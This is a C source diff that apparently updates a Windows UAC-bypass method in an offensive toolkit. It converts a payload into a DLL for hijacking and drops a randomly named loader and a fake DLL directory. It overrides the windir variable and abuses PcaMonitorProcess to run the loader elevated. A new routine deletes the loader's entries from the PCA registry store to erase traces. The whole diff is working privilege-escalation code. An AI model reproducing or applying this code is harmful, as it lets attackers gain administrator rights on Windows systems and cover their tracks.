@@ -1388,6 +1388,92 @@ FARPROC ucmxGetPcaMonitorProcess()
     return pfnRoutine;
 }
 
+/*
+* ucmxRemoveLoaderEntryFromStore
+*
+* Purpose:
+*
+* Cleanup PCA store.
+*
+*/
+ULONG ucmxRemoveLoaderEntryFromStore(
+    _In_ LPCWSTR lpLoaderName
+)
+{
+    HKEY hKey;
+
+    DWORD i, dwValuesCount = 0, cchValue, dwType, cRemoved = 0;
+
+    WCHAR szValue[MAX_PATH + 1];
+
+    do {
+        if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER,
+            T_PCA_STORE,
+            0,
+            KEY_READ | KEY_SET_VALUE,
+            &hKey))
+        {
+            break;
+        }
+
+        if (ERROR_SUCCESS != RegQueryInfoKey(hKey,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            &dwValuesCount,
+            NULL,
+            NULL,
+            NULL,
+            NULL))
+        {
+            break;
+        }
+
+        if (dwValuesCount == 0)
+            break;
+
+        RtlSecureZeroMemory(&szValue, sizeof(szValue));
+
+        for (i = 0; i < dwValuesCount; i++) {
+
+            dwType = 0;
+            cchValue = MAX_PATH;
+
+            if (ERROR_SUCCESS == RegEnumValue(hKey,
+                i,
+                (LPWSTR)&szValue,
+                (LPDWORD)&cchValue,
+                NULL,
+                &dwType,
+                NULL,
+                NULL))
+            {
+                if (dwType == REG_BINARY) {
+
+                    if (NULL != _strstri(szValue, lpLoaderName)) {
+
+                        if (ERROR_SUCCESS == RegDeleteValue(hKey, szValue))
+                            cRemoved++;
+
+                    }
+                }
+
+                szValue[0] = 0;
+            }
+
+        }
+
+
+    } while (FALSE);
+
+    RegCloseKey(hKey);
+
+    return cRemoved;
+}
+
 typedef struct _PCA_LOADER_BLOCK {
     ULONG OpResult;
     WCHAR szLoader[MAX_PATH + 1];
@@ -1407,7 +1493,7 @@ NTSTATUS ucmPcaMethod(
 )
 {
     BOOL fEnvSet = FALSE, fDirCreated = FALSE, fLoaderCreated = FALSE;
-    ULONG pcaStatus;
+    ULONG pcaStatus = 0, seedValue;
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED, ntStatus;
     HRESULT hr_init;
     SIZE_T cchDirName = 0, nLen, viewSize = PAGE_SIZE;
@@ -1420,12 +1506,19 @@ NTSTATUS ucmPcaMethod(
     STARTUPINFO startupInfo;
     PROCESS_INFORMATION processInfo;
 
-    PCA_LOADER_BLOCK *pvLoaderBlock = NULL;
+    PCA_LOADER_BLOCK* pvLoaderBlock = NULL;
+
+    LARGE_INTEGER liValue;
+
+    OBJECT_ATTRIBUTES obja;
+    UNICODE_STRING usObjectName;
 
     WCHAR szBuffer[MAX_PATH * 2], szEnvVar[MAX_PATH * 2];
-    WCHAR szLoader[MAX_PATH + 1];
+    WCHAR szLoader[MAX_PATH * 2];
+    WCHAR szLoaderName[64];
+
     WCHAR szLoaderCmdLine[2];
-    WCHAR szObjectName[MAX_PATH + 1];
+    WCHAR szObjectName[MAX_PATH];
 
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
@@ -1435,29 +1528,44 @@ NTSTATUS ucmPcaMethod(
     RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
 
     do {
+        RtlSecureZeroMemory(&szLoaderName, sizeof(szLoaderName));
+
+        seedValue = ~GetTickCount();
+        liValue.LowPart = RtlRandomEx(&seedValue);
+        seedValue = GetTickCount();
+        liValue.HighPart = RtlRandomEx(&seedValue);
+
+        supBinTextEncode(liValue.QuadPart, szLoaderName);
+        _strcat(szLoaderName, TEXT(".exe"));
+
         //
         // Create shared loader section.
         //
         RtlSecureZeroMemory(&szObjectName, sizeof(szObjectName));
-        supGenerateSharedObjectName((WORD)FUBUKI_PCA_SECTION_ID, szObjectName);
+        _strcpy(szObjectName, TEXT("\\Sessions\\"));
+        ultostr(NtCurrentPeb()->SessionId, _strend(szObjectName));
+        _strcat(szObjectName, TEXT("\\BaseNamedObjects\\"));
+        supGenerateSharedObjectName((WORD)FUBUKI_PCA_SECTION_ID, _strend(szObjectName));
 
-        //
-        // N.B. 
-        // This will create section in the current session BaseNamedObjects directory.
-        //
-        hSharedSection = CreateFileMapping(INVALID_HANDLE_VALUE,
-            NULL,
+        liValue.QuadPart = PAGE_SIZE;
+
+        RtlInitUnicodeString(&usObjectName, szObjectName);
+        InitializeObjectAttributes(&obja, &usObjectName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+        ntStatus = NtCreateSection(&hSharedSection,
+            SECTION_ALL_ACCESS,
+            &obja,
+            &liValue,
             PAGE_READWRITE,
-            0,
-            PAGE_SIZE,
-            szObjectName);
+            SEC_COMMIT,
+            NULL);
 
-        if (hSharedSection == NULL) {
-            OutputDebugString(L"[UCM] CreateFileMapping failed\r\n");
+        if (!NT_SUCCESS(ntStatus) || (hSharedSection == NULL)) {
+            OutputDebugString(L"[UCM] NtCreateSection failed\r\n");
             break;
         }
 
-        OutputDebugString(L"[UCM] CreateFileMapping success\r\n");
+        OutputDebugString(L"[UCM] Shared section create OK\r\n");
 
         ntStatus = NtMapViewOfSection(
             hSharedSection,
@@ -1481,15 +1589,19 @@ NTSTATUS ucmPcaMethod(
         //
         // Create completion event.
         //
-        _strcpy(szObjectName, TEXT("Global\\"));
+        _strcpy(szObjectName, TEXT("\\BaseNamedObjects\\"));
         supGenerateSharedObjectName((WORD)FUBUKI_PCA_EVENT_ID, _strend(szObjectName));
-        hSharedEvent = CreateEvent(NULL, FALSE, FALSE, szObjectName);
-        if (hSharedEvent == NULL) {
-            OutputDebugString(L"[UCM] CreateEvent(SharedEvent) failed\r\n");
+
+        RtlInitUnicodeString(&usObjectName, szObjectName);
+        InitializeObjectAttributes(&obja, &usObjectName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+        ntStatus = NtCreateEvent(&hSharedEvent, EVENT_ALL_ACCESS, &obja, SynchronizationEvent, FALSE);
+        if (!NT_SUCCESS(ntStatus) || (hSharedEvent == NULL)) {
+            OutputDebugString(L"[UCM] SharedEvent create failed\r\n");
             break;
         }
 
-        OutputDebugString(L"[UCM] CreateEvent(SharedEvent) success\r\n");
+        OutputDebugString(L"[UCM] SharedEvent create OK\r\n");
 
         //
         // Query PCACLI!PcaMonitorProcess.
@@ -1533,7 +1645,7 @@ NTSTATUS ucmPcaMethod(
         fDirCreated = TRUE;
 
         //
-        // Convert payload to dll for 1 stage.
+        // Convert payload to dll for dll hijack.
         //
         if (!supReplaceDllEntryPoint(
             ProxyDll,
@@ -1576,10 +1688,10 @@ NTSTATUS ucmPcaMethod(
         OutputDebugString(L"[UCM] supReplaceDllEntryPoint(PCAEXE) success\r\n");
 
         //
-        // Drop loader to the temp dir as winver.exe.
+        // Drop loader to the temp dir.
         //
         _strcpy(szLoader, g_ctx->szTempDirectory);
-        _strcat(szLoader, WINVER_EXE);
+        _strcat(szLoader, szLoaderName);
         fLoaderCreated = supWriteBufferToFile(szLoader, ProxyDll, ProxyDllSize);
         if (!fLoaderCreated) {
             OutputDebugString(L"[UCM] supWriteBufferToFile(PCAEXE) failed\r\n");
@@ -1645,8 +1757,8 @@ NTSTATUS ucmPcaMethod(
         //
         pcaStatus = PcaMonitorProcess(
             processInfo.hProcess,
-            1, 
-            szLoader, 
+            1,
+            szLoader,
             szLoaderCmdLine,
             szEnvVar,
             PCA_MONITOR_PROCESS_NORMAL);
@@ -1658,53 +1770,58 @@ NTSTATUS ucmPcaMethod(
         }
 
         OutputDebugString(L"[UCM] PcaMonitorProcess(Loader) success\r\n");
-        
-        ResumeThread(processInfo.hThread);
-        WaitForSingleObject(processInfo.hProcess, INFINITE);
 
+        ResumeThread(processInfo.hThread);
+
+        OutputDebugString(L"[UCM] Waiting for process started\r\n");
+        WaitForSingleObject(processInfo.hProcess, INFINITE);
         OutputDebugString(L"[UCM] Waiting for process finished\r\n");
 
-        WaitForSingleObject(hSharedEvent, 200 * 1000);
-
+        OutputDebugString(L"[UCM] Waiting for shared event start\r\n");
+        WaitForSingleObject(hSharedEvent, 20 * 1000);
         OutputDebugString(L"[UCM] Waiting for event finished\r\n");
 
         MethodResult = (pvLoaderBlock->OpResult == FUBUKI_PCA_ALL_RUN) ? STATUS_SUCCESS : STATUS_ACCESS_DENIED;
 
-        if (pvLoaderBlock->OpResult != FUBUKI_PCA_ALL_RUN)
+        if (pvLoaderBlock->OpResult != FUBUKI_PCA_ALL_RUN) {
             OutputDebugString(L"[UCM] Loader failed\r\n");
+            supSetGlobalCompletionEvent();
+        } 
+        else
+            OutputDebugString(L"[UCM] Loader task completed\r\n");
 
     } while (FALSE);
+
+    OutputDebugString(L"[UCM] Cleanup\r\n");
 
     Sleep(2500);
 
     //
     // Cleanup.
     //
-    if (fEnvSet)
-        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);
-
-    if (szLoader[0]) {
-
-        OutputDebugString(L"[UCM] Cleanup, loader regentry");
-        OutputDebugString(szLoader);
-        OutputDebugString(L"\r\n");
-
-        RegDeleteKeyValue(
-            HKEY_CURRENT_USER,
-            T_PCA_STORE,
-            szLoader);
-
-    }
-
     if (processInfo.hProcess)
         CloseHandle(processInfo.hProcess);
     if (processInfo.hThread)
         CloseHandle(processInfo.hThread);
 
+    if (hSharedEvent)
+        NtClose(hSharedEvent);
+
+    if (pvSharedSection)
+        NtUnmapViewOfSection(NtCurrentProcess(), (PVOID)pvLoaderBlock);
+
+    if (hSharedSection)
+        NtClose(hSharedSection);
+
+    if (fEnvSet)
+        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);
+
+    if (ucmxRemoveLoaderEntryFromStore(szLoaderName) > 0)
+        OutputDebugString(L"[UCM] Cleanup, store entry removed");
+
     if (fLoaderCreated) {
         OutputDebugString(L"[UCM] Cleanup, loader file");
         OutputDebugString(szLoader);
-        OutputDebugString(L"\r\n");
 
         DeleteFile(szLoader);
     }
@@ -1712,7 +1829,6 @@ NTSTATUS ucmPcaMethod(
     if (fDirCreated) {
         OutputDebugString(L"[UCM] Cleanup, fake dll");
         OutputDebugString(szBuffer);
-        OutputDebugString(L"\r\n");
 
         DeleteFile(szBuffer);
 
@@ -1720,22 +1836,12 @@ NTSTATUS ucmPcaMethod(
 
         OutputDebugString(L"[UCM] Cleanup, fake dir");
         OutputDebugString(szBuffer);
-        OutputDebugString(L"\r\n");
 
         RemoveDirectory(szBuffer);
     }
 
     if (SUCCEEDED(hr_init))
         CoUninitialize();
-
-    if (hSharedEvent)
-        CloseHandle(hSharedEvent);
-
-    if (pvSharedSection)
-        NtUnmapViewOfSection(NtCurrentProcess(), (PVOID)pvLoaderBlock);
-
-    if (hSharedSection)
-        CloseHandle(hSharedSection);
 
     return MethodResult;
 }
